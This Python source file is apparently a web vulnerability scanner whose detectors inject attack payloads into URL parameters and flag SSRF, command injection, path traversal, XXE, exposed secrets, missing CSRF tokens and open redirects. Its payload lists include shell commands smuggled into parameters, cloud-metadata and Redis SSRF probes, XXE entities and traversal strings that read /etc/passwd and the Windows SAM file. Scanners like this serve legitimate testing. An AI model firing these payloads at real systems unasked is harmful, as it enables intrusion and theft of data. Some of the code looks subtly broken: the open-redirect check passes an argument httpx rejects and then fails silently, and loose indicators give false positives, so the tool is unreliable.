from typing import Dict, List, Any, Optional
import asyncio
import httpx
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class BaseDetector:
    name: str = ""
    description: str = ""
    
    def __init__(self, timeout: int = 30):
        self.timeout = timeout
        self.client: Optional[httpx.AsyncClient] = None
        self.findings: List[Dict] = []
    
    async def init_client(self):
        self.client = httpx.AsyncClient(timeout=self.timeout, follow_redirects=True)
    
    async def close(self):
        if self.client:
            await self.client.aclose()
    
    async def scan(self, url: str, **kwargs) -> Dict:
        raise NotImplementedError
    
    def create_finding(self, url: str, param: str, payload: str, vuln_type: str, severity: str, description: str) -> Dict:
        return {
            'url': url,
            'param': param,
            'payload': payload,
            'type': vuln_type,
            'severity': severity,
            'description': description
        }
    
    def inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query, keep_blank_values=True)
        query_dict[param] = [payload]
        new_query = urlencode(query_dict, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
    
    def get_summary(self) -> Dict:
        return {
            'total': len(self.findings),
            'high': len([f for f in self.findings if f['severity'] == 'high']),
            'medium': len([f for f in self.findings if f['severity'] == 'medium']),
            'low': len([f for f in self.findings if f['severity'] == 'low']),
        }

class SSRFDetector(BaseDetector):
    name = "ssrf"
    description = "服务端请求伪造"
    
    PAYLOADS = [
        "http://localhost",
        "http://127.0.0.1",
        "http://[::1]",
        "http://169.254.169.254",
        "http://metadata.google.internal",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "dict://localhost:11211/stats",
        "gopher://127.0.0.1:6379/_INFO",
    ]
    
    async def scan(self, url: str, **kwargs) -> Dict:
        await self.init_client()
        try:
            params = self._extract_params(url)
            
            for param in params:
                for payload in self.PAYLOADS:
                    test_url = self.inject_param(url, param, payload)
                    try:
                        response = await self.client.get(test_url)
                        if self._check_ssrf(response, payload):
                            finding = self.create_finding(
                                url=url,
                                param=param,
                                payload=payload,
                                vuln_type='ssrf',
                                severity='high',
                                description='发现 SSRF 漏洞，攻击者可利用此漏洞访问内网资源'
                            )
                            self.findings.append(finding)
                    except Exception:
                        continue
        finally:
            await self.close()
        
        return {'findings': self.findings, 'summary': self.get_summary()}
    
    def _extract_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _check_ssrf(self, response, payload: str) -> bool:
        content = response.text.lower()
        indicators = [
            'localhost', '127.0.0.1', '[::1]',
            'aws access', 'amazon', 'ec2',
            'metadata', '169.254', 'instance',
            'root:', 'bin:', 'daemon:',
            'redis', 'memcached'
        ]
        return any(ind in content for ind in indicators)

class CommandInjectionDetector(BaseDetector):
    name = "command_injection"
    description = "命令注入"
    
    PAYLOADS = [
        "; whoami",
        "| whoami",
        "& whoami",
        "&& whoami",
        "|| whoami",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "; ls -la",
        "| ls",
        "&& sleep 5",
        "; sleep 5",
    ]
    
    async def scan(self, url: str, **kwargs) -> Dict:
        await self.init_client()
        try:
            params = self._extract_params(url)
            
            for param in params:
                for payload in self.PAYLOADS:
                    test_url = self.inject_param(url, param, payload)
                    try:
                        response = await self.client.get(test_url)
                        if self._check_command(response, payload):
                            finding = self.create_finding(
                                url=url,
                                param=param,
                                payload=payload,
                                vuln_type='command_injection',
                                severity='high',
                                description='发现命令注入漏洞，攻击者可执行任意系统命令'
                            )
                            self.findings.append(finding)
                    except Exception:
                        continue
        finally:
            await self.close()
        
        return {'findings': self.findings, 'summary': self.get_summary()}
    
    def _extract_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _check_command(self, response, payload: str) -> bool:
        content = response.text.lower()
        cmd_indicators = ['root:', 'bin:', 'daemon:', 'www-data:', 'user:', 'admin:']
        return any(ind in content for ind in cmd_indicators)

class PathTraversalDetector(BaseDetector):
    name = "path_traversal"
    description = "路径遍历"
    
    PAYLOADS = [
        "../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "../../../etc/passwd",
        "/etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]
    
    async def scan(self, url: str, **kwargs) -> Dict:
        await self.init_client()
        try:
            params = self._extract_params(url)
            
            for param in params:
                for payload in self.PAYLOADS:
                    test_url = self.inject_param(url, param, payload)
                    try:
                        response = await self.client.get(test_url)
                        if self._check_traversal(response):
                            finding = self.create_finding(
                                url=url,
                                param=param,
                                payload=payload,
                                vuln_type='path_traversal',
                                severity='medium',
                                description='发现路径遍历漏洞，攻击者可读取服务器任意文件'
                            )
                            self.findings.append(finding)
                    except Exception:
                        continue
        finally:
            await self.close()
        
        return {'findings': self.findings, 'summary': self.get_summary()}
    
    def _extract_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _check_traversal(self, response) -> bool:
        content = response.text.lower()
        indicators = ['root:x:', '[boot loader]', 'apache', 'nginx', 'www-data']
        return any(ind in content for ind in indicators)

class XXEDetector(BaseDetector):
    name = "xxe"
    description = "XML 外部实体"
    
    PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
    ]
    
    async def scan(self, url: str, **kwargs) -> Dict:
        await self.init_client()
        try:
            params = self._extract_params(url)
            
            for param in params:
                for payload in self.PAYLOADS:
                    test_url = self.inject_param(url, param, payload)
                    try:
                        response = await self.client.post(
                            test_url,
                            data={'xml': payload},
                            headers={'Content-Type': 'application/xml'}
                        )
                        if self._check_xxe(response):
                            finding = self.create_finding(
                                url=url,
                                param=param,
                                payload=payload,
                                vuln_type='xxe',
                                severity='high',
                                description='发现 XXE 漏洞，攻击者可读取服务器文件或进行内网探测'
                            )
                            self.findings.append(finding)
                    except Exception:
                        continue
        finally:
            await self.close()
        
        return {'findings': self.findings, 'summary': self.get_summary()}
    
    def _extract_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _check_xxe(self, response) -> bool:
        content = response.text.lower()
        indicators = ['root:x:', 'boot loader', 'systemd', 'apache', 'nginx', 'www-data']
        return any(ind in content for ind in indicators)

class SensitiveInfoDetector(BaseDetector):
    name = "sensitive_info"
    description = "敏感信息泄露"
    
    PATTERNS = {
        'api_key': [
            r'api[_-]?key["\']?\s*[:=]\s*["\']?[a-zA-Z0-9]{20,}["\']?',
            r'api[_-]?secret["\']?\s*[:=]\s*["\']?[a-zA-Z0-9]{20,}["\']?',
        ],
        'aws_key': [
            r'AKIA[0-9A-Z]{16}',
            r'aws[_-]?access[_-]?key[_-]?id',
        ],
        'jwt': [
            r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*',
        ],
        'private_key': [
            r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',
        ],
        'password': [
            r'password["\']?\s*[:=]\s*["\']?[^"\'\s]{6,}["\']?',
            r'passwd["\']?\s*[:=]\s*["\']?[^"\'\s]{6,}["\']?',
        ],
        'database': [
            r'mysql://[^\s]+',
            r'postgresql://[^\s]+',
            r'mongodb://[^\s]+',
            r'redis://[^\s]+',
        ],
    }
    
    async def scan(self, url: str, **kwargs) -> Dict:
        await self.init_client()
        try:
            response = await self.client.get(url)
            
            for info_type, patterns in self.PATTERNS.items():
                for pattern in patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    if matches:
                        for match in matches[:3]:
                            finding = self.create_finding(
                                url=url,
                                param='response_body',
                                payload=str(match)[:100],
                                vuln_type='sensitive_info',
                                severity='medium',
                                description=f'发现敏感信息泄露: {info_type}'
                            )
                            self.findings.append(finding)
        except Exception:
            pass
        finally:
            await self.close()
        
        return {'findings': self.findings, 'summary': self.get_summary()}

class CSRFDetector(BaseDetector):
    name = "csrf"
    description = "跨站请求伪造"
    
    async def scan(self, url: str, **kwargs) -> Dict:
        await self.init_client()
        try:
            response = await self.client.get(url)
            
            forms = self._extract_forms(response.text, url)
            
            for form in forms:
                csrf_token = self._check_csrf_protection(form)
                if not csrf_token:
                    finding = self.create_finding(
                        url=form['action'],
                        param=str(form['inputs'][:3]),
                        payload='No CSRF Token',
                        vuln_type='csrf',
                        severity='medium',
                        description='表单缺少 CSRF Token 保护，可能存在 CSRF 风险'
                    )
                    self.findings.append(finding)
        finally:
            await self.close()
        
        return {'findings': self.findings, 'summary': self.get_summary()}
    
    def _extract_forms(self, html: str, base_url: str) -> List[Dict]:
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(html, 'lxml')
        forms = []
        for form in soup.find_all('form'):
            forms.append({
                'action': form.get('action', ''),
                'method': form.get('method', 'get').lower(),
                'inputs': [{'name': i.get('name'), 'type': i.get('type')} for i in form.find_all(['input', 'textarea']) if i.get('name')]
            })
        return forms
    
    def _check_csrf_protection(self, form: Dict) -> bool:
        input_names = [inp.get('name', '').lower() for inp in form.get('inputs', [])]
        csrf_indicators = ['csrf', 'token', '_token', 'xsrf']
        return any(any(ind in name for ind in csrf_indicators) for name in input_names)

class OpenRedirectDetector(BaseDetector):
    name = "open_redirect"
    description = "开放重定向"
    
    PAYLOADS = [
        "https://evil.com",
        "http://evil.com",
        "//evil.com",
        "///evil.com",
        "javascript://alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ]
    
    async def scan(self, url: str, **kwargs) -> Dict:
        await self.init_client()
        try:
            params = self._extract_params(url)
            
            for param in params:
                for payload in self.PAYLOADS:
                    test_url = self.inject_param(url, param, payload)
                    try:
                        response = await self.client.get(test_url, allow_redirects=False)
                        if self._check_redirect(response, payload):
                            finding = self.create_finding(
                                url=url,
                                param=param,
                                payload=payload,
                                vuln_type='open_redirect',
                                severity='low',
                                description='发现开放重定向漏洞，用户可能被钓鱼'
                            )
                            self.findings.append(finding)
                    except Exception:
                        continue
        finally:
            await self.close()
        
        return {'findings': self.findings, 'summary': self.get_summary()}
    
    def _extract_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _check_redirect(self, response, payload: str) -> bool:
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location', '')
            return payload in location or 'evil' in location.lower()
        return False
